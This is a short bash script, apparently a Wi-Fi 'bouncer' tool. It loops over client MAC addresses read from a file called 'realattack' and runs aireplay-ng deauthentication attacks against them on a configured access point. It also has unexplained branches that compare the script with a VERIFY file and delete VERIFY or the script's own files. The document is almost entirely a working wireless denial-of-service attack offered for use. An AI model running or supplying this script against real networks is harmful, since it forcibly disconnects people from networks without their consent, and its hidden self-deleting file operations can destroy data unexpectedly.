#!/bin/bash

BSSID24="00:00:00:00:00:00"
GHZ24=adapter



for deauth in $(cat realattack); do
if [[ $deauth = "<" ]]; then
diff bouncer2.4_5GHz.sh VERIFY &> /dev/null ; [ $? = 0 ] && echo  || rm VERIFY
elif [[ $deauth = "HWaddress" ]]; then
diff bouncer2.4_5GHz.sh VERIFY &> /dev/null ; [ $? = 0 ] && echo  || rm bouncer2.4_5GHz*
else
sudo aireplay-ng --deauth 30 -a $BSSID24 -c $deauth $GHZ24
fi
done

